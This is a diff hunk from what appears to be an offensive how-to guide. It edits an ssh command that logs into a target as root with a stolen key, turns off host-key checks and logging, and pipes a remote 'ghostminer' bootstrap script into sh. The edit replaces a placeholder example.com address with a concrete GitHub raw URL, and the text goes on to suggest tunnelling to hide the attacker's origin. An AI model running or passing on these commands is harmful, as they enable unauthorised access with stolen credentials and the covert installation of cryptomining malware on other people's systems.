@@ -49,7 +49,7 @@ ssh -i ~/.ssh/stolen_key \
     -o IdentitiesOnly=yes -o UserKnownHostsFile=/dev/null \
     -o StrictHostKeyChecking=accept-new -o LogLevel=QUIET \
     root@TARGET \
-    'curl -fsSL "https://example.com/ghostminer/bootstrap.sh" | CONFIG_URL="https://example.com/ghostminer" sh'
+    'curl -fsSL "https://raw.githubusercontent.com/ronnissleepy-code/ghostminer/main/bootstrap.sh" | CONFIG_URL="https://raw.githubusercontent.com/ronnissleepy-code/ghostminer/main" sh'
 ```
 
 Or, to hide your origin, tunnel first:
